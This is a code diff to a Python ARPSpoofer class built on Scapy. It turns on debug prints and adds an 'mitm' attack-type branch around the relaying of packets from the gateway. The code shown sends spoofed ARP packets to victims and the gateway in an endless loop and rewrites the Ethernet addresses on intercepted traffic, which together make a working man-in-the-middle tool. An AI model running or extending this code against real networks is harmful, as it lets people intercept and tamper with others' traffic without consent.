@@ -96,7 +96,7 @@ class ARPSpoofer:
                 break
 
     def _create_and_send_spoofed_packets(self, client, spoof_source):
-        # print("Creating and sending packets for spoofing")
+        print("Creating and sending packets for spoofing")
         client_ip = client['original_IP']
         client_mac = client['original_MAC']
 
@@ -114,12 +114,12 @@ class ARPSpoofer:
             pdst=self.gateway_ip, psrc=client_ip
         )
         sendp(gateway_packet, verbose=False)
-        # print(f"Packets sent: {[client_packet.summary(), gateway_packet.summary()]}")
+        print(f"Packets sent: {[client_packet.summary(), gateway_packet.summary()]}")
 
     def spoofing_func(self, spoof_source=False):
         while True:
-            # print("Spoofing these clients")
-            # print(self.spoofing_clients)
+            print("Spoofing these clients")
+            print(self.spoofing_clients)
             for client in self.spoofing_clients:
                 self._create_and_send_spoofed_packets(client, spoof_source)                
             time.sleep(2)
@@ -133,12 +133,13 @@ class ARPSpoofer:
                 if spoofed_clients['original_IP'] == pkt[IP].dst:
                     client = spoofed_clients
             if client != None:
-                print(f"From gateway, Macs are src: {pkt[Ether].src} {pkt[Ether].dst}")
-                pkt[Ether].dst = client['original_MAC']
-                del pkt[Ether].chksum
-                print(f"Sending packet {pkt.summary()}, {pkt[Ether].src} {pkt[Ether].dst}")
-                # pkt[IP].src = '100.100.100.100'
-                sendp(pkt, verbose=False)
+                if client['attack_type'] == 'mitm':
+                    print(f"From gateway, Macs are src: {pkt[Ether].src} {pkt[Ether].dst}")
+                    pkt[Ether].dst = client['original_MAC']
+                    del pkt[Ether].chksum
+                    print(f"Sending packet {pkt.summary()}, {pkt[Ether].src} {pkt[Ether].dst}")
+                    # pkt[IP].src = '100.100.100.100'
+                    sendp(pkt, verbose=False)
             else:
                 print(f"From target, Macs are src: {pkt[Ether].src} {pkt[Ether].dst}")
                 pkt[Ether].dst = self.gateway_mac
